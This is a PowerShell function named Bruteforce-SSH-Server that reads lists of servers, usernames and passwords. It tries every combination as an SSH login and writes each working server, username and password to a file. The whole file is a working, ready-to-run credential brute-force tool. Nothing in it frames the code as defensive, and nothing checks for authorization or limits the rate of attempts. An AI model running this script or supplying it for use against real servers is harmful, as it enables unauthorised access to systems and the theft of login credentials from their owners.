Function Bruteforce-SSH-Server {
    <#
    .SYNOPSIS
        Bruteforces a list of SSH servers using a list of usernames and passwords.

    .DESCRIPTION
        Bruteforces a list of SSH servers using a list of usernames and a list of passwords.

    .PARAMETER Servers
        Path to a text file containing a list of server URLs or IPs.

    .PARAMETER Usernames
        Path to a text file containing the usernames you wish to bruteforce. 

    .PARAMETER Passwords
        Path to a text file containing the passwords you wish to use to bruteforce with.

    .PARAMETER OutputPath
        Path to the output file you would like to save, must include full filename and extension.

    .EXAMPLE
        Bruteforce-SSH-Server -Servers "C:\Servers.txt" -Usernames "C:\Usernames.txt" -Passwords "C:\Passwords.txt" -OutputPath "C:\Output.txt"

    #>
    Param
    (
        [Parameter(Mandatory = $true)]
        [string] $Servers,

        [Parameter(Mandatory = $true)]
        [string] $Usernames,

        [Parameter(Mandatory = $true)]
        [string] $Passwords,

        [Parameter(Mandatory = $true)]
        [string] $OutputPath
    )

    #Gets contents of the Servers, Usernames, and Passwords text files. 	
    $ServersArray = Get-Content $Servers
    $UsernamesArray = Get-Content $Usernames
    $PasswordsArray = Get-Content $Passwords	

    #Loops through the arrays built from the text files. 
    Foreach ($UrlOfServer in $ServersArray) {		
        Foreach ($Username in $UsernamesArray) {
            Foreach ($Password in $PasswordsArray) {
                #Attempts to login to the SSH Server
                $Password = $Password.ToString()
                $PasswordEnc = $Password | ConvertTo-SecureString -AsPlainText -Force
                $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $PasswordEnc                            
                $VerboseOutput = "Trying to connect to " + $Username + "@" + $UrlOfServer + " with password " + $Password
                Write-Host $VerboseOutput
                New-SshSession -ComputerName $UrlOfServer -Credential $Creds -ErrorAction SilentlyContinue -AcceptKey
                $Ses = Get-SshSession -SessionId 0

                If ($Ses.Session.IsConnected -eq $True) {
                    #If the login attempt was successful we append the Server, Username, and Password to the file. 
                    $VerboseOutput = "Connected to " + $Username + "@" + $UrlOfServer + " with password " + $Password + "! Outputting to file."
                    Write-Host $VerboseOutput
                    $Output = $UrlOfServer + ", " + $Username + ", " + $Password 
                    $Output | Out-File -Append -FilePath $OutputPath
                    Remove-SshSession -SessionId 0    
                    Break   
                } Else {
                    #If the login attempt fails the function just continues on to the next combination. 
                    $VerboseOutput = "Error connecting to " + $Username + "@" + $UrlOfServer + " with password " + $Password
                    Write-Host $VerboseOutput
                }
            }
        }	
    }
}
